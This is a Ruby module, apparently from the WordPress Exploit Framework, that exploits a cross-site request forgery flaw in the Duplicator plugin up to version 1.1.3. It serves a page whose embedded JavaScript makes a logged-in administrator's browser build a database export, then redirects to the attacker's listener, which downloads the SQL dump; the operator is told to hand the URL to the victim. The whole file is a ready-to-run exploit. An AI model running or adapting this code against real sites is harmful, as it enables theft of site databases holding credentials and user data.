# frozen_string_literal: true

require 'wpxf/helpers/export'

class Wpxf::Auxiliary::DuplicatorCsrfDbExport < Wpxf::Module
  include Wpxf
  include Wpxf::Net::HttpServer
  include Wpxf::Helpers::Export

  def initialize
    super

    update_info(
      name: 'Duplicator <= 1.1.3 CSRF Database Export',
      desc: %(
        This module exploits a cross-site request forgery vulnerability found
        in Duplicator <= 1.1.3 which will create a database export when a user
        visits the generated web page.
      ),
      author: [
        'RatioSec Research', # Discovery and disclosure
        'rastating'          # WPXF module
      ],
      references: [
        ['WPVDB', '8388'],
        ['URL', 'http://www.ratiosec.com/2016/duplicator-wordpress-plugin-source-database-disclosure-via-csrf/'],
        ['URL', 'http://www.securityfocus.com/archive/1/537506'],
        ['URL', 'http://lifeinthegrid.com/support/knowledgebase.php?article=20']
      ],
      date: 'Feb 10 2016'
    )

    register_options([
      StringOption.new(
        name: 'local_host',
        desc: 'The address of the host listening for a connection',
        required: true
      ),
      StringOption.new(
        name: 'complete_path',
        desc: 'The path to request when the attack is complete',
        required: true,
        default: Utility::Text.rand_alpha(rand(6..10))
      )
    ])

    register_export_path_option(true)
  end

  def check
    check_plugin_version_from_readme('duplicator', '1.1.4')
  end

  def complete_path
    datastore['complete_path']
  end

  def local_host_base_url
    "http://#{datastore['local_host']}:#{http_server_bind_port}/"
  end

  def complete_url
    "#{local_host_base_url}#{complete_path}"
  end

  def package_hash
    @package_hash ||= Utility::Text.rand_alpha(6)
  end

  def package_name
    @package_name ||= Utility::Text.rand_alpha(6)
  end

  def page_script
    func1 = Utility::Text.rand_alpha(rand(5..10))
    func2 = Utility::Text.rand_alpha(rand(5..10))
    %|
      debugger;

      function #{func2}() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "#{wordpress_url_admin_ajax}?action=duplicator_package_build", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-GB,en;q=0.5");
        xhr.withCredentials = true;
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
        xhr.onreadystatechange = function() {
          if (xhr.readyState == 4) {
            window.location = '#{complete_url}';
          }
        };
      }

      function #{func1}() {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "#{normalize_uri(wordpress_url_admin, 'admin.php')}?page=duplicator&tab=new2", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-GB,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.withCredentials = true;
        var body = "action=&package-hash=#{package_hash}&package-name=#{package_name}&package-notes=&archive-format=ZIP&filter-dirs=&filter-exts=&dbhost=&dbport=&dbname=&dbuser=&url-new=";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
        xhr.onreadystatechange = function() {
          if (xhr.readyState == 4) {
            #{func2}();
          }
        };
      }

      #{func1}();
    |
  end

  def page_markup
    %(
      <html>
      <head>
      </head>
      <body>
        <script>
          #{page_script}
        </script>
      </body>
      </html>
    )
  end

  def on_http_request(path, _params, _headers)
    if path.eql?("/#{complete_path}")
      emit_info 'Checking for remote backup...'
      download_backup
      ''
    else
      emit_info 'Serving page to client...'
      { type: 'text/html', body: page_markup }
    end
  end

  def download_backup
    url = normalize_uri(full_uri, 'wp-snapshots', "#{package_name}_#{package_hash}_database.sql")
    emit_info "Checking URL: #{url}", true
    sleep(5)
    res = download_file(url: url, method: :get, local_filename: export_path)
    return unless res.code == 200

    @success = true
    emit_success "Downloaded backup to #{export_path}"
    stop_http_server
  end

  def run
    return false unless super

    emit_info 'Provide the URL below to the victim to begin the database backup'
    puts
    puts local_host_base_url
    puts

    start_http_server
    @success
  end
end
